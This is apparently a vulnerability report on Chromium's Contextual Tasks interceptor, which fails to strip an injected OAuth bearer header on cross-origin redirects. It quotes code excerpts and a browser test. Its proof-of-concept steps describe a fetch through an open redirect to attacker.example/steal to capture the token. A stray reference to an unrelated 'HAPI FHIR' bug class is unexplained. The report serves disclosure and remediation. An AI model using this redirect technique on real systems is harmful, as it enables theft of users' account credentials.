### Title
Cross-origin OAuth `Authorization` header leak on HTTP redirect in Contextual Tasks URLLoaderFactory interceptor - (File: chrome/browser/contextual_tasks/contextual_tasks_url_loader_factory_interceptor.cc)

### Summary
`ContextualTasksProxyingURLLoaderFactory` injects a live OAuth `Authorization: Bearer <token>` header onto requests whose URL/initiator match an allow-list (`google.com`, `googlers.com`), then wraps the request in a custom `ContextualTasksURLLoader`. Unlike every other header-injecting throttle in the codebase, this loader's `FollowRedirect` implementation forwards the caller-supplied `headers_update_params` unmodified and never strips the injected `Authorization` header when the redirect target is a different, untrusted origin, allowing the token to leak to an attacker-controlled host reached via an HTTP 30x redirect.

### Finding Description
`ContextualTasksProxyingURLLoaderFactory::CreateLoaderAndStart` (chrome/browser/contextual_tasks/contextual_tasks_url_loader_factory_interceptor.cc:249-334) attaches an OAuth bearer token to `request.headers` via `OnAccessTokenReceived` (lines 341-375) when the request URL and initiator pass `ShouldAddAuthHeader` (lines 63-84, an allow-list of `google.com`/`googlers.com` domains). The request (with the token already baked into `request_.headers`) is then handed to a `ContextualTasksURLLoader` (lines 114-221), a bespoke `network::mojom::URLLoader`/`URLLoaderClient` proxy.

When the target server responds with a redirect, `OnReceiveRedirect` (lines 167-170) simply forwards the redirect info to the renderer-side client without touching headers. When the renderer (or fetch/XHR redirect-follow logic) subsequently calls back `FollowRedirect`:

```
void FollowRedirect(
    network::HttpRequestHeadersUpdateParams headers_update_params,
    const std::optional<GURL>& new_url) override {
  if (target_loader_) {
    target_loader_->FollowRedirect(std::move(headers_update_params), new_url);
  }
}
```
(lines 139-145)

there is no check of `new_url`'s origin against the allow-list, and no code path adds the `Authorization` header name to `headers_update_params.removed_headers`. Since the header was injected directly onto `request_.headers` in the browser process (invisible to the calling JS/renderer), the renderer has no way to request its removal, and this proxy is the only place with knowledge that the header was synthetically added — yet it does nothing with that knowledge on redirect.

This is a stark contrast to every other similar header-injection mechanism in the same codebase, all of which explicitly strip previously injected sensitive headers on cross-origin redirect:
- `AwURLLoaderThrottle::WillRedirectRequest` explicitly checks `SameDomainOrHost` and removes injected headers on cross-domain redirect. [1](#0-0) 
- `ContextualTasksURLLoaderThrottle::WillRedirectRequest` (a *different* throttle in the very same feature) explicitly adds its custom header to `removed_headers` when the redirect target is non-Google. [2](#0-1) 
- `PlatformAuthNavigationThrottle` removes injected `Cookie`/auth headers on cross-origin redirect. [3](#0-2) 
- `ChromeWebStoreNavigationThrottle` removes DM-token/device-ID headers on redirect away from the Web Store origin. [4](#0-3) 
- The variations `X-Client-Data` header is likewise stripped on cross-origin redirect. [5](#0-4) 

The `ContextualTasksURLLoader::FollowRedirect` code path is the exception that breaks this consistent pattern. [6](#0-5) 

This interceptor is installed via `MaybeInterceptURLLoaderFactory` (lines 388-441), inserted into the URLLoaderFactory used by `<webview>` guest frames owned by the `chrome://contextual-tasks` WebUI. [7](#0-6) 
Existing tests confirm attacker-influenced content executing inside that guest webview (including content navigated to via `data:` or otherwise "untrusted" origins) can trigger `fetch()` calls that this factory intercepts and attaches the token to. [8](#0-7) 

### Impact Explanation
An OAuth `Authorization: Bearer <token>` credential — a highly privacy/security sensitive secret capable of impersonating the signed-in Google user for API calls — can be exfiltrated to an arbitrary, attacker-controlled host. This is a cross-origin credential disclosure (CWE-200 analog, matching the reported HAPI FHIR bug class) reachable from web content loaded in the guest `<webview>`, matching Critical severity if the allow-listed target host (e.g. an open-redirect endpoint under `*.google.com` or `*.googlers.com`) can be induced to 30x-redirect to attacker infrastructure.

### Likelihood Explanation
The `ShouldAddAuthHeader` allow-list is coarse (any host matching `google.com`/`googlers.com` via `DomainIs`), so an attacker only needs to find (or cause navigation to) any URL under those domains that issues an HTTP redirect (a known frequent occurrence — open redirectors, login/consent flows, tracking redirectors) to trigger the leak, and needs the webview's guest content to make a `fetch()`/navigation to it. The browsertest suite already exercises the "untrusted initiator" and webview-fetch code paths, showing this surface is reachable and tested for other invariants, but no test exercises the redirect-stripping behavior, consistent with it being missing.

### Recommendation
In `ContextualTasksURLLoader::FollowRedirect`, before forwarding to `target_loader_`, compare the redirect target's origin (or at minimum re-run `ShouldAddAuthHeader`/domain-allow-list check) against the origin the `Authorization` header was attached for, and add `kAuthorizationHeader` to `headers_update_params.removed_headers` (and clear it from `request_.headers`) whenever the destination is not an allowed, same-trust-level origin — mirroring the pattern already used by `AwURLLoaderThrottle::WillRedirectRequest` and `ContextualTasksURLLoaderThrottle::WillRedirectRequest`.

### Proof of Concept
1. Load `chrome://contextual-tasks`, which creates a guest `<webview>` intercepted by `ContextualTasksProxyingURLLoaderFactory` (`MaybeInterceptURLLoaderFactory`).
2. Have webview content (attacker-influenced, e.g. via an open-redirect/consent URL under an allow-listed `google.com` subdomain) perform `fetch('https://accounts.google.com/openredirect?to=https://attacker.example/steal')`.
3. `OnAccessTokenReceived` attaches `Authorization: Bearer <token>` to the request (`chrome/browser/contextual_tasks/contextual_tasks_url_loader_factory_interceptor.cc:352-360`).
4. The allow-listed server responds `302 Location: https://attacker.example/steal`.
5. `OnReceiveRedirect` forwards the redirect to the renderer; the renderer's fetch redirect-follow logic invokes `FollowRedirect` back on the mojo pipe.
6. `ContextualTasksURLLoader::FollowRedirect` (lines 139-145) forwards the request to `target_loader_` without removing `Authorization`, so the token is sent to `attacker.example`.

void AwURLLoaderThrottle::WillRedirectRequest(
    net::RedirectInfo* redirect_info,

    network::HttpRequestHeadersUpdateParams* headers_update_params) {
  if (!added_headers_.empty()) {
    bool is_same_domain = net::registry_controlled_domains::SameDomainOrHost(
        redirect_info->new_url, original_origin_,
        net::registry_controlled_domains::INCLUDE_PRIVATE_REGISTRIES);

    if (!is_same_domain) {
      // The headers we added must be removed.
      headers_update_params->removed_headers.insert(
          headers_update_params->removed_headers.end(),
          std::make_move_iterator(added_headers_.begin()),
          std::make_move_iterator(added_headers_.end()));

    }
  }
}

void MaybeInterceptURLLoaderFactory(
    content::RenderFrameHost* frame,
    network::URLLoaderFactoryBuilder& factory_builder) {
  if (!frame) {
    return;
  }

  content::WebContents* owner_web_contents = nullptr;

#if BUILDFLAG(ENABLE_EXTENSIONS)
  // Check if this is a WebView guest.
  extensions::WebViewGuest* guest =
      extensions::WebViewGuest::FromRenderFrameHost(frame);
  if (!guest) {
    return;
  }

  // Check if the owner is the Contextual Tasks WebUI.
  owner_web_contents = guest->owner_web_contents();
#endif

  if (!owner_web_contents) {
    return;
  }

  const GURL& owner_url = owner_web_contents->GetLastCommittedURL();
  if (owner_url.scheme() != content::kChromeUIScheme ||
      owner_url.host() != chrome::kChromeUIContextualTasksHost) {
    OMNIBOX_LOG("nav_trace") << "ContextualTasks navigation trace: "
               "MaybeInterceptURLLoaderFactory owner_url is not "
               "chrome://contextual-tasks";
    return;
  }

IN_PROC_BROWSER_TEST_F(ContextualTasksUrlLoaderFactoryInterceptorBrowserTest,
                       UntrustedInitiatorOriginDoesNotHaveAuthToken) {
  base::RunLoop run_loop;
  header_capture_quit_closure_ = run_loop.QuitClosure();

  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(), GURL(chrome::kChromeUIContextualTasksURL)));

  content::WebContents* web_ui_contents =
      TabListInterface::From(browser())->GetActiveTab()->GetContents();

  // Destination is a trusted Google host, but initiator will be an untrusted
  // data: origin.
  GURL fetch_url =
      https_server_.GetURL(kTestHost, "/untrusted/echoheader?Authorization");

  std::string script = content::JsReplace(
      R"(
    (async () => {
      const waitFor = (selector, scope = document) => {
        return new Promise(resolve => {
          if (scope.querySelector(selector)) {
            return resolve(scope.querySelector(selector));
          }
          const observer = new MutationObserver(() => {
            if (scope.querySelector(selector)) {
              observer.disconnect();
              resolve(scope.querySelector(selector));
            }
          });
          observer.observe(scope, {childList: true, subtree: true});
        });
      };

      const app = await waitFor('contextual-tasks-app');
      await new Promise(resolve => {
        app.setOnLoadStartFinishedCallbackForTesting(resolve);
      });
      if (!app.shadowRoot) {
        await customElements.whenDefined('contextual-tasks-app');
      }
      const webview = await waitFor('#threadFrame', app.shadowRoot);

      // Navigate webview to an untrusted origin (data: URL).
      const targetUrl = 'data:text/html,<html><body></body></html>';
      webview.src = targetUrl;

      // Wait for load
      await new Promise((resolve, reject) => {
        const stop = () => {
            webview.removeEventListener('loadstop', stop);
            webview.removeEventListener('loadabort', abort);
            resolve();
        };
        const abort = (e) => {
            if (e.url === targetUrl) {
                webview.removeEventListener('loadstop', stop);
                webview.removeEventListener('loadabort', abort);
                reject('Load aborted for ' + e.url + ': ' + e.reason);
            }
        };
        webview.addEventListener('loadstop', stop);
        webview.addEventListener('loadabort', abort);
      });

      // Execute fetch inside webview to trusted Google destination.
      webview.executeScript({code: `fetch($1, {mode: 'cors'});`});
    })();
  )",
      fetch_url.spec());

  EXPECT_TRUE(content::ExecJs(web_ui_contents, script));

  run_loop.Run();

  // Verify that the Authorization header was NOT injected.
  EXPECT_TRUE(captured_auth_header_.empty());
}
